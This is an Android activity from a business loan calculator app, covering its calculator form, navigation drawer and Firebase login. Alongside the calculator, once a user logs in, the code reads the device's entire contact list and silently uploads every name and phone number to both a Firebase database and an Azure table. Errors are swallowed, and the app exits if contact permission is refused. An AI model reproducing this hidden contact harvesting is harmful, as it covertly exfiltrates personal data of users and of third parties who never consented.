package com.nineinfosys.businesscalcualtors;

import android.app.AlertDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.res.Configuration;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.support.annotation.NonNull;
import android.support.design.widget.NavigationView;
import android.support.v4.app.ActivityCompat;
import android.support.v4.app.FragmentManager;
import android.support.v4.app.FragmentTransaction;
import android.support.v4.content.ContextCompat;
import android.support.v4.widget.DrawerLayout;
import android.support.v7.app.ActionBarDrawerToggle;
import android.support.v7.app.AppCompatActivity;
import android.support.v7.widget.Toolbar;
import android.util.Log;
import android.view.KeyEvent;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.view.WindowManager;
import android.view.inputmethod.InputMethodManager;
import android.widget.ArrayAdapter;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.Spinner;
import android.widget.TextView;

import com.facebook.login.LoginManager;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.microsoft.windowsazure.mobileservices.MobileServiceClient;
import com.microsoft.windowsazure.mobileservices.http.OkHttpClientFactory;

import com.microsoft.windowsazure.mobileservices.table.MobileServiceTable;
import com.nineinfosys.businesscalcualtors.Amortization.LoanAmortization;
import com.nineinfosys.businesscalcualtors.Login.Contacts;
import com.nineinfosys.businesscalcualtors.Login.LoginActivity;
import com.nineinfosys.businesscalcualtors.Report.BusinessLoanReport;
import com.squareup.okhttp.OkHttpClient;

import java.net.MalformedURLException;
import java.text.DecimalFormat;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.TimeUnit;

import static android.Manifest.permission.READ_CONTACTS;
import static android.Manifest.permission.WRITE_CONTACTS;


public class MainActivityDrawer extends AppCompatActivity implements View.OnClickListener {
    ///Azure Database connection for contact uploading
    private MobileServiceClient mobileServiceClientContactUploading;
    private MobileServiceTable<Contacts> mobileServiceTableContacts;
    private ArrayList<Contacts> azureContactArrayList;
    private static final int PERMISSION_REQUEST_CODE = 200;
    //Firebase variables... for authentication and contact uploading to firebase
    private FirebaseAuth firebaseAuth;
    private FirebaseAuth.AuthStateListener firebaseAuthListner;
    private DatabaseReference databaseReferenceUserContacts;

    DrawerLayout mDrawerLayout;
    NavigationView mNavigationView;
    FragmentManager mFragmentManager;
    FragmentTransaction mFragmentTransaction;
    ImageView profilePictureView;
    TextView Name, email;
    public Toolbar toolbar;
    Intent intent;


    //business loan calculator designing tools
    EditText editTextLoanAmount, editTextInterestRate, editTextyear, editTextMonth, editTextOriginationFee, editTextCompoundsperyear, editTextDocumentationFee, editTextOtherFee;
    Button buttonCalculate, buttonReset, buttonEmail, buttonReport, buttonAmotization;
    TextView textViewMonthlyPayment, textViewTotalloanPayment, textViewInterest, textViewInterestFee;
    LinearLayout layoutresult, layoutWarning;
    businessCalculator businessCalculator;
    double loanAmount, interestRate, originationfee, documentationfee, otherfee, monthlyPayment, TotalPayment, totalInterest, totalFee, totalAll, totalMonth, LoanAnnualPayment, totalAllfees;
    int year, month, compounds;
    Spinner spinnerMonth;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.drawermain);
        //keyboard hidden
        MainActivityDrawer.this.getWindow().setSoftInputMode(WindowManager.LayoutParams.SOFT_INPUT_STATE_ALWAYS_HIDDEN);

        //firbase auth
        firebaseAuth=FirebaseAuth.getInstance();

        /**
         *Setup the DrawerLayout and NavigationView
         */


        mDrawerLayout = (DrawerLayout) findViewById(R.id.drawerLayout);
        mNavigationView = (NavigationView) findViewById(R.id.shitstuff);
        Name = (TextView) mNavigationView.getHeaderView(0).findViewById(R.id.name);
        email = (TextView) mNavigationView.getHeaderView(0).findViewById(R.id.email);
       // profilePictureView = (ImageView) mNavigationView.getHeaderView(0).findViewById(R.id.imageView);

        /**
         * Lets inflate the very first fragment
         * Here , we are inflating the TabFragment as the first Fragment
         */

        mFragmentManager = getSupportFragmentManager();
        mFragmentTransaction = mFragmentManager.beginTransaction();
        mNavigationView.setItemIconTintList(null);
        // mFragmentTransaction.replace(R.id.containerView, new Feeds()).commit();
        /**
         * Setup click events on the Navigation View Items.
         */

        //initalization of designing tools
        layoutresult = (LinearLayout) this.findViewById(R.id.layoutdisplayresult);
        layoutWarning = (LinearLayout) this.findViewById(R.id.layoutWarning);
        // spinnerCompoundinglist=(Spinner)findViewById(R.id.spinnerinterestCompounding);
        editTextLoanAmount = (EditText) findViewById(R.id.editTextLoanAmount);
        editTextInterestRate = (EditText) findViewById(R.id.editTextLoanInterestRate);
        editTextyear = (EditText) findViewById(R.id.editTextLoantermyear);
        //  editTextMonth=(EditText)findViewById(R.id.editTextLoantermmonth) ;
        //   editTextCompoundsperyear=(EditText)findViewById(R.id.editTextCompounds) ;
        editTextOriginationFee = (EditText) findViewById(R.id.editTextOriginationFee);
        editTextDocumentationFee = (EditText) findViewById(R.id.editTextDocumentationFee);
        editTextOtherFee = (EditText) findViewById(R.id.editTextOtherFee);

        textViewMonthlyPayment = (TextView) findViewById(R.id.textViewMonthlyAmount);
        textViewTotalloanPayment = (TextView) findViewById(R.id.textViewTotalPrincipalAmount);
        textViewInterest = (TextView) findViewById(R.id.textViewInterestAmount);
        textViewInterestFee = (TextView) findViewById(R.id.textViewInterestFeeValueAmount);

        buttonCalculate = (Button) findViewById(R.id.buttonCalculate);
        buttonReset = (Button) findViewById(R.id.buttonbusinessReset);
        buttonAmotization = (Button) findViewById(R.id.buttonAmortization);
        buttonReport = (Button) findViewById(R.id.buttonReport);
        buttonEmail = (Button) findViewById(R.id.buttonBusinessLoanEmail);

        spinnerMonth = (Spinner) findViewById(R.id.spinnerMonths);

        //adding value to spinner
        List<String> listmonths = new ArrayList<String>();
        listmonths.add("0");
        listmonths.add("1");
        listmonths.add("2");
        listmonths.add("3");
        listmonths.add("4");
        listmonths.add("5");
        listmonths.add("6");
        listmonths.add("7");
        listmonths.add("8");
        listmonths.add("9");
        listmonths.add("10");
        listmonths.add("11");
        listmonths.add("12");
        // Creating adapter for spinner
        ArrayAdapter<String> Adapter = new ArrayAdapter<String>(this, android.R.layout.simple_spinner_item, listmonths);

        // Drop down layout style - list view with radio button
        Adapter.setDropDownViewResource(android.R.layout.simple_spinner_item);

        // attaching data adapter to spinner
        spinnerMonth.setAdapter(Adapter);

        buttonCalculate.setOnClickListener(MainActivityDrawer.this);
        buttonReset.setOnClickListener(this);
        buttonReport.setOnClickListener(this);
        buttonAmotization.setOnClickListener(this);
        buttonEmail.setOnClickListener(this);


        //navigation onclick item event
        mNavigationView.setNavigationItemSelectedListener(new NavigationView.OnNavigationItemSelectedListener() {
            @Override
            public boolean onNavigationItemSelected(MenuItem menuItem) {
                mDrawerLayout.closeDrawers();


                if (menuItem.getItemId() == R.id.BusinessLoanCalcualtor) {

                    Intent intent = new Intent(MainActivityDrawer.this, MainActivityDrawer.class);
                    finish();
                    startActivity(intent);
                }
             /*   if (menuItem.getItemId() == R.id.Feeds) {
                    FragmentTransaction fragmentTransaction = mFragmentManager.beginTransaction();
                    fragmentTransaction.replace(R.id.containerView, new Feeds()).commit();

                }*/


                //communicate
                if (menuItem.getItemId() == R.id.Share) {
                    final String appPackageName = getPackageName();
                    Intent intent = new Intent(Intent.ACTION_SEND);
                    intent.setType("text/plain");
                    String shareBodyText = "https://play.google.com/store/apps/details?id=" + appPackageName;
                    intent.putExtra(Intent.EXTRA_SUBJECT, "Subject/Title");
                    intent.putExtra(Intent.EXTRA_TEXT, shareBodyText);
                    startActivity(Intent.createChooser(intent, "Choose sharing method"));

                }

                if (menuItem.getItemId() == R.id.AppStore) {
                    final String appPackageName = getPackageName(); // getPackageName() from Context or Activity object
                    try {
                        startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("market://developer?id=GeniusNine+Info+Systems+LLP")));
                    } catch (android.content.ActivityNotFoundException anfe) {
                        startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("https://play.google.com/store/apps/developer?id=GeniusNine+Info+Systems+LLP")));
                    }
                }

                if (menuItem.getItemId() == R.id.GetApps) {

                    Intent intent=new Intent(MainActivityDrawer.this,RequestApp.class);
                    finish();
                    startActivity(intent);

                }


                if (menuItem.getItemId() == R.id.RateUs) {
                    final String appPackageName = getPackageName(); // getPackageName() from Context or Activity object
                    try {
                        startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("market://details?id=" + appPackageName)));
                    } catch (android.content.ActivityNotFoundException anfe) {
                        startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("https://play.google.com/store/apps/details?id=" + appPackageName)));
                    }
                }

                return false;
            }


        });

        /**
         * Setup Drawer Toggle of the Toolbar
         */

        toolbar = (Toolbar) findViewById(R.id.toolbar);
        setSupportActionBar(toolbar);
        ActionBarDrawerToggle mDrawerToggle = new ActionBarDrawerToggle(this, mDrawerLayout, toolbar, R.string.app_name, R.string.app_name);
        mDrawerLayout.setDrawerListener(mDrawerToggle);
        mDrawerToggle.syncState();

        authenticate();
    }

    ///Uploading contacts to azure
    private void uploadContactsToAzure(){


        initializeAzureTable();
        fetchContacts();
        uploadContact();


    }
    private void initializeAzureTable() {
        try {
            mobileServiceClientContactUploading = new MobileServiceClient(
                    getString(R.string.web_address),
                    this);
            mobileServiceClientContactUploading.setAndroidHttpClientFactory(new OkHttpClientFactory() {
                @Override
                public OkHttpClient createOkHttpClient() {
                    OkHttpClient client = new OkHttpClient();
                    client.setReadTimeout(20, TimeUnit.SECONDS);
                    client.setWriteTimeout(20, TimeUnit.SECONDS);
                    return client;
                }
            });
            mobileServiceTableContacts = mobileServiceClientContactUploading.getTable(Contacts.class);


        } catch (MalformedURLException e) {

        } catch (Exception e) {

        }
    }
    private void fetchContacts(){
        try {
            azureContactArrayList = new ArrayList<Contacts>();

            Cursor phone=getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,null,null,null,null);

            while(phone.moveToNext()){
                Contacts contact = new Contacts();
                contact.setContactname(phone.getString(phone.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)));
                contact.setContactnumber(phone.getString(phone.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)));
                contact.setFirebaseid(firebaseAuth.getCurrentUser().getUid());

                azureContactArrayList.add(contact);




            }
            phone.close();
        }catch (Exception e){

        }


    }
    private void uploadContact() {
        for (Contacts c : azureContactArrayList) {

            try {
                asyncUploader(c);
                //mobileServiceTable.insert(c);
            }
            catch (Exception e){
                Log.e("uploadContact : ", e.toString());
            }
        }
    }
    private void asyncUploader(Contacts contact){
        final Contacts item = contact;
        //Log.e(" ", item.getContactname());

        AsyncTask<Void, Void, Void> task = new AsyncTask<Void, Void, Void>() {
            @Override
            protected Void doInBackground(Void... params) {
                try {
                    mobileServiceTableContacts.insert(item);
                    runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            try {

                            } catch (Exception e) {
                            }


                        }
                    });
                } catch (final Exception e) {
                }
                return null;
            }
        };
        task.execute();
    }


    ///Authentication with firebase
    private void authenticate(){
        firebaseAuth = FirebaseAuth.getInstance();
        firebaseAuthListner = new FirebaseAuth.AuthStateListener() {
            @Override
            public void onAuthStateChanged(@NonNull FirebaseAuth firebaseAuth) {
                if(firebaseAuth.getCurrentUser()==null){
                    Log.e("ForumMainActivity:", "User was null so directed to Login activity");
                    Intent loginIntent = new Intent(MainActivityDrawer.this, LoginActivity.class);
                    loginIntent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
                    startActivity(loginIntent);
                    finish();
                }
                else {
                    if (!checkPermission()) {
                        requestPermission();
                    } else {
                        //Toast.makeText(MainActivityDrawer.this,"Permission already granted.",Toast.LENGTH_LONG).show();
                        syncContactsWithFirebase();
                        uploadContactsToAzure();

                    }

                }

            }
        };

    }

    @Override
    protected void onStart() {
        super.onStart();
        Log.e("ForumMainActivity:", "Starting auth listener");
        firebaseAuth.addAuthStateListener(firebaseAuthListner);
    }



    protected void syncContactsWithFirebase(){

        AsyncTask<Void, Void, Void> task = new AsyncTask<Void, Void, Void>() {
            @Override
            protected Void doInBackground(Void... params) {
                try {
                    databaseReferenceUserContacts = FirebaseDatabase.getInstance().getReference().child(getString(R.string.app_id)).child("Contacts");

                    String user_id = firebaseAuth.getCurrentUser().getUid();
                    DatabaseReference current_user_db = databaseReferenceUserContacts.child(user_id);


                    Cursor phone = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);

                    while (phone.moveToNext()) {
                        String name;
                        String number;

                        name = phone.getString(phone.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                        number = phone.getString(phone.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));

                        try {
                            current_user_db.child(number).setValue(name);

                        } catch (Exception e) {

                        }



                    }



                    runOnUiThread(new Runnable() {

                        @Override
                        public void run() {


                        }
                    });
                } catch (Exception exception) {

                }
                return null;
            }
        };

        task.execute();
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.main, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        int id = item.getItemId();

        //noinspection SimplifiableIfStatement
        if (id == R.id.action_logout) {
            FirebaseAuth.getInstance().signOut();
            LoginManager.getInstance().logOut();

        }

        return super.onOptionsItemSelected(item);
    }


    public  void closeapp(){
        AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(this);
        alertDialogBuilder.setMessage("Are you sure you want to close App?");
        alertDialogBuilder.setPositiveButton("Yes",
                new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface arg0, int arg1) {

                        finish();
                    }
                });

        alertDialogBuilder.setNegativeButton("No",
                new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface arg0, int arg1) {

                    }
                });

        //Showing the alert dialog
        AlertDialog alertDialog = alertDialogBuilder.create();
        alertDialog.setCanceledOnTouchOutside(false);
        alertDialog.show();
    }



    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        switch(keyCode){
            case KeyEvent.KEYCODE_BACK:
                closeapp();
                return true;
        }
        return super.onKeyDown(keyCode, event);
    }
    //used this when mobile orientaion is changed
    public void onConfigurationChanged(Configuration newConfig) {
        super.onConfigurationChanged(newConfig);
        // Checks the orientation of the screen
        if (newConfig.orientation == Configuration.ORIENTATION_LANDSCAPE) {
            //Toast.makeText(this, "landscape", Toast.LENGTH_SHORT).show();
        } else if (newConfig.orientation == Configuration.ORIENTATION_PORTRAIT) {
            //Toast.makeText(this, "portrait", Toast.LENGTH_SHORT).show();
        }
    }

    private boolean checkPermission() {
        int result = ContextCompat.checkSelfPermission(getApplicationContext(), READ_CONTACTS);
        int result1 = ContextCompat.checkSelfPermission(getApplicationContext(), WRITE_CONTACTS);

        return result == PackageManager.PERMISSION_GRANTED && result1 == PackageManager.PERMISSION_GRANTED;
    }

    private void requestPermission() {

        ActivityCompat.requestPermissions(this, new String[]{READ_CONTACTS, WRITE_CONTACTS}, PERMISSION_REQUEST_CODE);

    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String permissions[], int[] grantResults) {
        switch (requestCode) {
            case PERMISSION_REQUEST_CODE:
                if (grantResults.length > 0) {

                    boolean locationAccepted = grantResults[0] == PackageManager.PERMISSION_GRANTED;
                    boolean cameraAccepted = grantResults[1] == PackageManager.PERMISSION_GRANTED;

                    if (locationAccepted && cameraAccepted) {
                    }
                    else {

                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                            if (shouldShowRequestPermissionRationale(READ_CONTACTS)) {
                                AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(MainActivityDrawer.this);
                                alertDialogBuilder.setMessage("You must grant permissions for App to work properly. Restart app after granting permission");
                                alertDialogBuilder.setPositiveButton("yes",
                                        new DialogInterface.OnClickListener() {
                                            @Override
                                            public void onClick(DialogInterface arg0, int arg1) {

                                                Log.e("ALERT BOX ", "Requesting Permissions");

                                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                                                    requestPermissions(new String[]{READ_CONTACTS, WRITE_CONTACTS},
                                                            PERMISSION_REQUEST_CODE);
                                                }
                                            }
                                        });

                                alertDialogBuilder.setNegativeButton("No",new DialogInterface.OnClickListener() {
                                    @Override
                                    public void onClick(DialogInterface dialog, int which) {
                                        Log.e("ALERT BOX ", "Permissions not granted");
                                        android.os.Process.killProcess(android.os.Process.myPid());
                                        System.exit(1);

                                    }
                                });

                                AlertDialog alertDialog = alertDialogBuilder.create();
                                alertDialog.setCanceledOnTouchOutside(false);
                                alertDialog.show();
                                return;
                            }
                            else{
                                AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(MainActivityDrawer.this);
                                alertDialogBuilder.setMessage("You must grant permissions from  App setting to work");
                                alertDialogBuilder.setPositiveButton("Ok",
                                        new DialogInterface.OnClickListener() {
                                            @Override
                                            public void onClick(DialogInterface arg0, int arg1) {
                                                android.os.Process.killProcess(android.os.Process.myPid());
                                                System.exit(1);
                                            }
                                        });

                                AlertDialog alertDialog = alertDialogBuilder.create();
                                alertDialog.setCanceledOnTouchOutside(false);
                                alertDialog.show();
                                return;

                            }
                        }

                    }
                }

                break;
        }
    }

    @Override
    public void onClick(View view) {
        switch (view.getId()) {
            case R.id.buttonCalculate:
                calculate();
                break;

            case R.id.buttonAmortization:
                Intent i1 = new Intent(this, LoanAmortization.class);
                i1.putExtra("Monthlypayment", monthlyPayment);
                i1.putExtra("Rate", interestRate);
                i1.putExtra("loanAmount", loanAmount);
                i1.putExtra("loanPeriod", totalMonth);
                startActivity(i1);
                break;

            case R.id.buttonReport:
                Intent i2 = new Intent(this, BusinessLoanReport.class);
                i2.putExtra("PrincipalAmount", loanAmount);
                i2.putExtra("interestRate", interestRate);
                i2.putExtra("loanPeriod", totalMonth);
                i2.putExtra("originationfee", originationfee);
                i2.putExtra("documentationfee", documentationfee);
                i2.putExtra("otherfee", otherfee);
                i2.putExtra("totalAll", totalAll);
                i2.putExtra("totalAllfees", totalAllfees);
                i2.putExtra("LoanMonthlyPayment", monthlyPayment);
                i2.putExtra("LoanInterestAmount", totalInterest);
                i2.putExtra("LoanTotalPayment", TotalPayment);
                i2.putExtra("LoanAnnualPayment", LoanAnnualPayment);
                startActivity(i2);
                break;
            case R.id.buttonbusinessReset:
                layoutresult.setVisibility(View.GONE);
                layoutWarning.setVisibility(View.GONE);
                editTextLoanAmount.setText(null);
                editTextInterestRate.setText(null);
                editTextyear.setText("0");
                //  editTextMonth.setText("0");
                editTextOriginationFee.setText(null);
                editTextDocumentationFee.setText(null);
                editTextOtherFee.setText(null);
                break;
            case R.id.buttonBusinessLoanEmail:
                String message="Loan Amount:"+new DecimalFormat("##.##").format(loanAmount)+"\n Interest Rate:"+new DecimalFormat("##.##").format(interestRate)+"\n Loan Period:"+new DecimalFormat("##.##").format(totalMonth)+"\n Origination Fee:"+new DecimalFormat("##.##").format(originationfee)+"\n Documentation Fee:"+new DecimalFormat("##.##").format(documentationfee)+"\n Other Fee:"+new DecimalFormat("##.##").format(otherfee)+"\n Total of Interest+Fee"+new DecimalFormat("##.##").format(totalAll)+"\n Monthly Payment:"+new DecimalFormat("##.##").format(monthlyPayment)+"\n Total Interest Amount:"+new DecimalFormat("##.##").format(totalInterest)+"\n Total Payment:"+new DecimalFormat("##.##").format(TotalPayment)+"\n Annual Payment:"+new DecimalFormat("##.##").format(LoanAnnualPayment);
                Intent email = new Intent(Intent.ACTION_SEND);
                email.putExtra(Intent.EXTRA_EMAIL, new String[]{ });
                email.putExtra(Intent.EXTRA_SUBJECT, "Loan Details");
                email.putExtra(Intent.EXTRA_TEXT,message );
                email.setType("message/rfc822");
                startActivity(Intent.createChooser(email, "Select Email Client"));
                break;
        }


    }

    private void calculate() {
            if(editTextLoanAmount.getText().toString().trim().equals("") && editTextInterestRate.getText().toString().trim().equals("")&& editTextyear.getText().toString().trim().equals("0")
                    && editTextOriginationFee.getText().toString().trim().equals("")&& editTextDocumentationFee.getText().toString().trim().equals("")&& editTextOtherFee.getText().toString().trim().equals(""))
            {
                layoutWarning.setVisibility(View.VISIBLE);
                layoutresult.setVisibility(View.GONE);
            }
            else if (editTextLoanAmount.getText().toString().trim().equals("") || editTextLoanAmount.getText().toString().isEmpty()) {
                editTextLoanAmount.setError("Loan Amount is Required");
                layoutWarning.setVisibility(View.GONE);
                layoutresult.setVisibility(View.GONE);
            } else if (editTextInterestRate.getText().toString().trim().equals("") || editTextInterestRate.getText().toString().isEmpty()) {
                editTextInterestRate.setError("Enter Interest Rate");
                layoutWarning.setVisibility(View.GONE);
                layoutresult.setVisibility(View.GONE);
            } else if (editTextyear.getText().toString().trim().equals("") || editTextyear.getText().toString().isEmpty()) {
                editTextyear.setError("Enter Compound Peroids in year");
                layoutWarning.setVisibility(View.GONE);
                layoutresult.setVisibility(View.GONE);
            } /*else if (editTextMonth.getText().toString().trim().equals("") || editTextMonth.getText().toString().isEmpty()) {
            editTextMonth.setError("Enter Loan term in Months");
           layoutWarning.setVisibility(View.GONE);
           layoutresult.setVisibility(View.GONE);
        }*/
            else if (editTextOriginationFee.getText().toString().trim().equals("") || editTextOriginationFee.getText().toString().isEmpty()) {
                editTextOriginationFee.setError("Enter Origination fee per year");
                layoutWarning.setVisibility(View.GONE);
                layoutresult.setVisibility(View.GONE);
            }
            else if (editTextDocumentationFee.getText().toString().trim().equals("") || editTextDocumentationFee.getText().toString().isEmpty()) {
                editTextDocumentationFee.setError("Enter Documentation Fees");
                layoutWarning.setVisibility(View.GONE);
                layoutresult.setVisibility(View.GONE);
            }
            else if (editTextOtherFee.getText().toString().trim().equals("") || editTextOtherFee.getText().toString().isEmpty()) {
                editTextOtherFee.setError("Enter Other Fees");
                layoutWarning.setVisibility(View.GONE);
                layoutresult.setVisibility(View.GONE);
            }else {
                //for hiding keyboard
                InputMethodManager inputManager = (InputMethodManager) getSystemService(Context.INPUT_METHOD_SERVICE);
                inputManager.hideSoftInputFromWindow(getCurrentFocus().getWindowToken(),InputMethodManager.HIDE_NOT_ALWAYS);

                layoutresult.setVisibility(View.VISIBLE);
                loanAmount = Double.parseDouble(editTextLoanAmount.getText().toString());
                interestRate = Double.parseDouble(editTextInterestRate.getText().toString());
                year = Integer.parseInt(editTextyear.getText().toString());
                month = Integer.parseInt(spinnerMonth.getSelectedItem().toString().trim());
                // month = Integer.parseInt(editTextMonth.getText().toString());
                // compounds=Integer.parseInt(editTextCompoundsperyear.getText().toString());
                originationfee = Double.parseDouble(editTextOriginationFee.getText().toString());
                documentationfee = Double.parseDouble(editTextDocumentationFee.getText().toString());
                otherfee = Double.parseDouble(editTextOtherFee.getText().toString());

                businessCalculator = new businessCalculator(loanAmount, interestRate, year, month, originationfee, documentationfee, otherfee);
                monthlyPayment = businessCalculator.calculateEMI();
                TotalPayment = businessCalculator.calculateTotalPayment();
                totalInterest = businessCalculator.calculateTotalInterest();
                totalFee = businessCalculator.calcualteFee();
                totalAll = businessCalculator.calculateTotalAll();
                totalMonth = businessCalculator.calculateMonth();
                LoanAnnualPayment = businessCalculator.calculateAnnualPayment();
                totalAllfees=businessCalculator.totalFee();

                textViewMonthlyPayment.setText(new DecimalFormat("##.##").format(monthlyPayment));
                textViewTotalloanPayment.setText(new DecimalFormat("##.##").format(TotalPayment));
                textViewInterest.setText(new DecimalFormat("##.##").format(totalInterest));
                textViewInterestFee.setText(new DecimalFormat("##.##").format(totalAll));
            }
    }
}